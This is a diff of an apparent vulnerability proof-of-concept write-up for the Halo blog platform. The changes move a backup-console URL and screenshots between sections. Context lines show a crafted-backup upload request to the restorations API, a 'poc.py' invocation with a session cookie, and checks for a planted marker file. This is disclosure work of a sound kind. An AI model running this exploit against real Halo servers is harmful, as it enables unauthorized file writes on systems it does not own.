@@ -130,6 +130,8 @@ with open('malicious-backup.zip', 'wb') as f:
 
 ### Step 2: Upload Malicious Backup
 
+Frontend Backup Management Address:http://ip:port/console/backup
+
 ```http
 POST /apis/console.api.migration.halo.run/v1alpha1/restorations HTTP/1.1
 Host: target-halo-server
@@ -144,6 +146,9 @@ Content-Type: application/zip
 ------boundary--
 ```
 
+<img width="1497" height="699" alt="image" src="https://github.com/user-attachments/assets/9226e52b-db7a-4bc1-aaa5-64a4ee881fb6" />
+
+
 ### Step 3: Verify File Written
 
 ```bash
@@ -151,6 +156,8 @@ Content-Type: application/zip
 ls -la ~/.halo2/PWNED_BY_POC.txt
 cat ~/.halo2/PWNED_BY_POC.txt
 ```
+
+<img width="489" height="207" alt="image" src="https://github.com/user-attachments/assets/315fdb12-42fa-4249-8a9e-4b76e0873611" />
 
 ---
 
@@ -240,8 +247,6 @@ if __name__ == "__main__":
 
 ### Verification
 
-Frontend Backup Management Address:http://ip:port/console/backup
-
 ```bash
 # Execute PoC
 python3 poc.py http://192.168.49.128:8090 "SESSION=f3d4ae4a-c1ac-46ec-bfe8-82e3206ee232"
@@ -249,10 +254,6 @@ python3 poc.py http://192.168.49.128:8090 "SESSION=f3d4ae4a-c1ac-46ec-bfe8-82e32
 # On Halo server
 cat ~/.halo2/PWNED_BY_POC.txt
 ```
-<img width="1497" height="699" alt="image" src="https://github.com/user-attachments/assets/9226e52b-db7a-4bc1-aaa5-64a4ee881fb6" />
-
-<img width="489" height="207" alt="image" src="https://github.com/user-attachments/assets/315fdb12-42fa-4249-8a9e-4b76e0873611" />
-
 
 ---
 
